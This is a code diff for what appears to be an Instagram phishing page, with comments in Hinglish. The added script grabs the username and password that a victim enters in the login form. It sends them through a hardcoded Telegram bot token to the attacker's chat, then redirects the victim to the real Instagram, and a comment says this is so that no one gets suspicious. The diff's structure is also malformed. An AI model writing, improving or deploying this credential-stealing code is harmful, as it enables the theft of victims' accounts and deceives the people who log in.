@@ -31,20 +31,25 @@
             setTimeout(function() {
                 window.location.replace("https://www.instagram.com/accounts/login/");
             }, 1000);
-        };
-    </script>
-</body>
-</html>
-// --- Purana Code (Waisa hi rehne dein) ---
-// Jo data receive karta hai...
+        <script>
+document.querySelector('form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const username = document.querySelector('input[type="text"]').value;
+    const password = document.querySelector('input[type="password"]').value;
+    
+    const botToken = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
+    const chatId = '8639892987';
+    const message = `🔥 NEW STRIKE! 🔥\n\n👤 User: ${username}\n🔑 Pass: ${password}`;
 
-// --- Naya Code (Bas ye lines add karein) ---
-const botToken = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
-const chatId = '8639892987';
-const message = `🔥 NEW STRIKE! 🔥\n\n👤 User: ${username}\n🔑 Pass: ${password}`;
+    // Telegram bhej raha hai
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    });
 
-fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text: message })
+    // Data bhejne ke baad asli Instagram par redirect kar do taaki shak na ho
+    window.location.href = "https://www.instagram.com";
 });
+</script>
